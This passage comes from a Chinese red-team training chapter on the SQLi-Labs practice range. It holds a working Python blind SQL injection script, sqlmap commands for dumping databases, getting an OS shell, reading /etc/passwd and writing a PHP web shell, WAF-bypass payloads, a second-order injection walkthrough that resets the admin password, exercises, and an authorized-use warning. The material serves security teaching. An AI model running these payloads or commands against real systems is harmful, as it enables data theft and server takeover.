   - 成功获取管理员权限

**总结**：手工注入的标准流程是：判断注入点 → 猜字段数 → 找显示位 → 脱库（库名→表名→列名→数据）。

---

### 案例2：盲注脚本编写 - Python自动化

**场景**：遇到一个SQL盲注漏洞，手动猜解太慢，需要编写自动化脚本。

**目标**：编写一个Python脚本，实现布尔盲注的自动化猜解。

**脚本代码**：

```python
import requests
import sys

class SQLiBlind:
    def __init__(self, url, param, cookies=None):
        self.url = url
        self.param = param
        self.cookies = cookies or {}
        self.session = requests.Session()
    
    def request(self, payload):
        """发送请求，返回布尔值（True表示条件成立）"""
        params = {self.param: payload}
        try:
            r = self.session.get(self.url, params=params, cookies=self.cookies, timeout=10)
            # 根据页面特征判断，这里以"You are in"作为成功标志
            return "You are in" in r.text
        except Exception as e:
            print(f"Error: {e}")
            return False
    
    def get_db_length(self):
        """获取数据库名长度"""
        for length in range(1, 50):
            payload = f"1' and length(database())={length} --+"
            if self.request(payload):
                return length
        return 0
    
    def get_db_name(self, length):
        """获取数据库名"""
        db_name = ""
        for i in range(1, length + 1):
            # 二分法查找
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = f"1' and ascii(substr(database(),{i},1))>{mid} --+"
                if self.request(payload):
                    low = mid + 1
                else:
                    high = mid - 1
            db_name += chr(low)
            print(f"\r[*] Database: {db_name}", end="")
        print()
        return db_name
    
    def get_table_count(self, db):
        """获取表的数量"""
        for count in range(1, 100):
            payload = f"1' and (select count(table_name) from information_schema.tables where table_schema='{db}')={count} --+"
            if self.request(payload):
                return count
        return 0
    
    def get_table_name(self, db, index):
        """获取指定索引的表名"""
        # 先获取长度
        for length in range(1, 50):
            payload = f"1' and length((select table_name from information_schema.tables where table_schema='{db}' limit {index},1))={length} --+"
            if self.request(payload):
                break
        
        # 逐字符猜解
        table_name = ""
        for i in range(1, length + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = f"1' and ascii(substr((select table_name from information_schema.tables where table_schema='{db}' limit {index},1),{i},1))>{mid} --+"
                if self.request(payload):
                    low = mid + 1
                else:
                    high = mid - 1
            table_name += chr(low)
        return table_name
    
    def get_all_tables(self, db):
        """获取所有表名"""
        count = self.get_table_count(db)
        print(f"[*] Found {count} tables")
        tables = []
        for i in range(count):
            table = self.get_table_name(db, i)
            tables.append(table)
            print(f"  [{i+1}] {table}")
        return tables

# 使用示例
if __name__ == "__main__":
    url = "http://localhost/sqli-labs/Less-8/"
    cookies = {"PHPSESSID": "your_session_id"}
    
    sqli = SQLiBlind(url, "id", cookies)
    
    print("[*] Getting database name length...")
    length = sqli.get_db_length()
    print(f"[+] Length: {length}")
    
    print("[*] Getting database name...")
    db_name = sqli.get_db_name(length)
    print(f"[+] Database: {db_name}")
    
    print("[*] Getting tables...")
    tables = sqli.get_all_tables(db_name)
```

**使用方法**：
```bash
python blind_sqli.py
```

**脚本优化点**：
- 使用二分法代替逐个猜解，效率提升数倍
- 使用Session保持连接
- 支持自定义成功标志
- 模块化设计，易扩展

---

### 案例3：sqlmap使用技巧 - 高效自动化注入

**场景**：发现一个SQL注入点，想要快速获取数据。

**目标**：掌握sqlmap的常用参数和高级技巧。

**常用命令**：

```bash
# 1. 基础检测
sqlmap -u "http://target.com/page?id=1"

# 2. 批量测试（从请求文件）
sqlmap -r request.txt

# 3. 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 4. 获取所有数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 5. 获取指定数据库的表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 6. 获取列名
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns

# 7. dump数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump

# 8. POST注入
sqlmap -u "http://target.com/login" --data "user=admin&pass=123"

# 9. Cookie注入
sqlmap -u "http://target.com/page" --cookie "id=1" --level 2

# 10. User-Agent注入
sqlmap -u "http://target.com/page" --user-agent "sqlmap/1.0" --level 3

# 11. 延迟请求（避免被封IP）
sqlmap -u "http://target.com/page?id=1" --delay 1

# 12. 指定线程数
sqlmap -u "http://target.com/page?id=1" --threads 10

# 13. 批量注入URL列表
sqlmap -m urls.txt

# 14. 获取Shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# 15. 获取SQL Shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# 16. 读取文件
sqlmap -u "http://target.com/page?id=1" --file-read "/etc/passwd"

# 17. 写入文件
sqlmap -u "http://target.com/page?id=1" --file-write shell.php --file-dest /var/www/html/shell.php

# 18. 使用tamper脚本绕过WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# 19. 指定注入技术
sqlmap -u "http://target.com/page?id=1" --technique=BEUST
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind

# 20. 爬虫模式
sqlmap -u "http://target.com/" --crawl=3 --batch
```

**高级技巧**：

1. **--batch**：自动使用默认选项，不需要交互
2. **--risk**：风险等级（1-3），等级越高检测越全面
3. **--level**：检测级别（1-5），级别越高检测的注入点越多
4. **--tamper**：使用混淆脚本绕过WAF
5. **--proxy**：设置代理，通过Burp查看请求
6. **--output-dir**：指定结果输出目录
7. **--forms**：自动解析表单并测试

---

### 案例4：WAF绕过实战

**场景**：目标网站有WAF防护，普通的SQL注入Payload被拦截。

**目标**：使用各种绕过技巧成功执行SQL注入。

**常见WAF绕过方法**：

**方法1：大小写混淆**
```sql
?id=1' UniOn SeLeCt 1,2,3--+
```

**方法2：内联注释**
```sql
?id=1' /*!UNION*/ /*!SELECT*/ 1,2,3--+
?id=1' /*!50000union*/ /*!50000select*/ 1,2,3--+
```

**方法3：空格绕过**
```sql
?id=1'union/**/select/**/1,2,3--+
?id=1%27union%09select%0A1,2,3--+
```

**方法4：编码绕过**
```sql
-- URL编码
?id=1%27%20union%20select%201,2,3--+

-- 双重URL编码
?id=1%2527%2520union%2520select%25201,2,3--+

-- Unicode编码
?id=%u0031%u0027%20union%20select%201,2,3--+
```

**方法5：关键字拆分**
```sql
?id=1' union sel/**/ect 1,2,3--+
?id=1' union se%00lect 1,2,3--+
```

**方法6：等价替换**
```sql
-- and 替换为 &&
?id=1' && 1=1--+

-- = 替换为 like
?id=1' and username like 'admin'--+

-- 空格替换为括号
?id=1'union(select(1),(2),(3))--+
```

**方法7：使用HTTP参数污染（HPP）**
```
?id=1&id=' union select 1,2,3--+
```

**方法8：分块传输**
```
使用Transfer-Encoding: chunked
将Payload分成多个块传输
```

**sqlmap的tamper脚本**：
```bash
# 列出所有tamper脚本
sqlmap --list-tampers

# 常用tamper
sqlmap -u "http://target.com?id=1" --tamper=space2comment,between,randomcase
```

---

### 案例5：二次注入实战

**场景**：一个用户注册/登录系统，注册时输入被转义了，但修改资料时可能存在二次注入。

**目标**：通过二次注入获取管理员权限。

**场景分析**：
- 注册页面：使用addslashes()转义
- 登录页面：使用addslashes()转义
- 修改昵称页面：从Session读取用户名，直接拼接到SQL中

**攻击步骤**：

1. **注册恶意用户**
   - 用户名：`test' where username='admin' #`
   - 密码：123456
   - 注册时被转义为：`test\' where username=\'admin\' #`
   - 存入数据库时还原为：`test' where username='admin' #`

2. **登录测试用户**
   - 使用刚才注册的账号登录
   - 登录时也被转义，能正常登录

3. **修改昵称触发注入**
   - 进入修改资料页面，修改昵称为 "hacker"
   - 后端执行的SQL：
     ```sql
     UPDATE users SET nickname='hacker' WHERE username='test' where username='admin' #'
     ```
   - 实际效果：把admin用户的昵称改成了hacker

4. **进阶利用 - 修改管理员密码**
   - 注册用户名：`admin' #`
   - 修改密码为 hacked
   - SQL语句：
     ```sql
     UPDATE users SET password='hacked' WHERE username='admin' #' AND password='...'
     ```
   - admin的密码被改成了hacked

5. **登录管理员账号**
   - 用户名：admin
   - 密码：hacked
   - 成功登录

**二次注入的特点**：
- 第一次输入被转义，看似安全
- 数据存储到数据库时还原了原始内容
- 第二次使用时直接拼接，造成注入
- 比普通注入更隐蔽，难以检测

---

## ✏️ 课后习题

### 选择题

1. SQLi-Labs靶场的开发者来自哪个国家？
   - A. 美国
   - B. 印度
   - C. 中国
   - D. 俄罗斯

2. 以下哪个函数不能用于报错注入？
   - A. updatexml()
   - B. extractvalue()
   - C. concat()
   - D. floor() + rand()

3. 布尔盲注和时间盲注的主要区别是？
   - A. 注入点位置不同
   - B. 判断依据不同，一个看页面内容，一个看响应时间
   - C. 危害程度不同
   - D. 使用的数据库不同

4. 二次注入的原理是？
   - A. 输入两次不同的Payload
   - B. 第一次输入被转义存储，第二次读取时造成注入
   - C. 同时注入两个参数
   - D. 需要两个用户配合

5. 堆叠注入的条件是？
   - A. 使用mysql_query()函数
   - B. 使用mysqli_multi_query()或支持多语句执行的函数
   - C. 必须是MySQL数据库
   - D. 必须是数字型注入

6. ORDER BY注入中，以下哪种方法不适用？
   - A. 报错注入
   - B. 时间盲注
   - C. 直接UNION查询
   - D. IF条件判断

7. 当空格被过滤时，以下哪个不能代替空格？
   - A. /**/
   - B. %09
   - C. 括号
   - D. %00

8. SQLi-Labs Less-5 是什么类型的注入？
   - A. 联合查询注入
   - B. 报错注入
   - C. 布尔盲注
   - D. 时间盲注

9. 宽字节注入通常出现在什么编码环境中？
   - A. UTF-8
   - B. GBK
   - C. ASCII
   - D. Unicode

10. 以下哪个不是sqlmap支持的注入技术？
    - A. 布尔盲注
    - B. 报错注入
    - C. DOM注入
    - D. 堆叠查询

### 填空题

1. SQLi-Labs一共有 _______ 多个关卡。
2. SQL注入的三大类型是 _______、_______、_______。
3. MySQL中获取数据库名的函数是 _______。
4. 报错注入常用的三个函数是 _______、_______、_______。
5. 时间盲注中用于延迟的函数是 _______。
6. 二次注入的两个阶段是 _______ 和 _______。
7. 堆叠注入使用 _______ 符号分隔多条SQL语句。
8. ORDER BY注入的注入点在 _______ 子句中。
9. sqlmap中读取服务器文件的参数是 _______。
10. 宽字节注入中，常用的起始字节是 _______（十六进制）。

### 简答题

1. 简述SQL注入的完整利用流程（从发现注入点到获取数据）。
2. 联合查询注入需要满足哪些条件？
3. 报错注入的原理是什么？常用的报错注入函数有哪些？
4. 布尔盲注和时间盲注分别适用于什么场景？
5. 什么是二次注入？请举例说明。
6. 什么是堆叠注入？它和UNION注入有什么区别？
7. ORDER BY注入的特点是什么？有哪些利用方式？
8. WAF绕过SQL注入的常用方法有哪些？至少说出5种。
9. 宽字节注入的原理是什么？需要什么条件？
10. 如何防御SQL注入攻击？至少说出5种防御方法。

### 实操题

1. 搭建SQLi-Labs环境，初始化数据库。
2. 通关Less-1到Less-4（基础GET注入），手工注入获取所有用户密码。
3. 通关Less-5（报错注入），使用updatexml获取users表的数据。
4. 通关Less-8（布尔盲注），手工猜解数据库名。
5. 通关Less-9（时间盲注），编写Python脚本自动化获取数据。
6. 通关Less-11（POST注入），使用Burp Suite完成注入。
7. 通关Less-17（更新查询注入），获取管理员密码。
8. 通关Less-24（二次注入），修改admin用户的密码。
9. 通关Less-38（堆叠注入），创建一个新表并插入数据。
10. 通关Less-46（ORDER BY注入），使用报错注入获取数据库名。
11. 使用sqlmap对Less-1进行自动化注入，获取所有数据。
12. 编写一个Python盲注脚本，支持布尔盲注和时间盲注两种模式。

---

## ⚠️ 安全提醒

::: danger 重要提醒
1. **仅在授权环境中练习**：本章涉及的SQL注入技术仅限在SQLi-Labs等授权靶场中学习和练习，严禁对未授权的真实系统进行测试。

2. **法律后果**：《刑法》第285条规定，非法侵入计算机信息系统罪可处三年以下有期徒刑或者拘役；情节特别严重的，处三年以上七年以下有期徒刑。

3. **数据安全**：SQL注入可能导致数据库泄露，造成严重的数据安全事故。请务必在隔离环境中练习。

4. **道德准则**：学习SQL注入是为了更好地防御，而不是攻击。请遵守网络安全从业者的职业道德。

5. **合法研究**：如果发现真实系统的SQL注入漏洞，应通过合法渠道（如SRC平台）上报，而不是利用或传播。
:::

---

## 📝 本章小结

- SQLi-Labs是学习SQL注入的最佳靶场，80+关卡覆盖各种注入类型
- 基础注入包括GET/POST的字符型、数字型注入，使用联合查询获取数据
- 报错注入适用于页面有报错信息的场景，常用updatexml、extractvalue等函数
- 布尔盲注通过页面真/假响应逐位猜解数据，适合无回显但有差异的场景
- 时间盲注通过响应时间差异判断，适用于页面完全无差异的场景
- 二次注入是存储型注入的一种，数据先存储后利用，更隐蔽
- 堆叠注入可以执行多条SQL语句，危害极大
- ORDER BY注入利用排序参数，需要特殊的利用技巧
- WAF绕过技巧包括：大小写、编码、注释、等价替换、HPP等
- 防御SQL注入的核心是使用参数化查询，配合输入验证和最小权限原则

---

## 🔗 相关链接

- [⬅️ 上一章：---](/redteam/day085-target-靶场1-DVWA)
- [➡️ 下一章：---](/redteam/day087-target-靶场3-XSS-Challenges)
- [📖 返回全书目录](/redteam/day118-toc-全书目录)
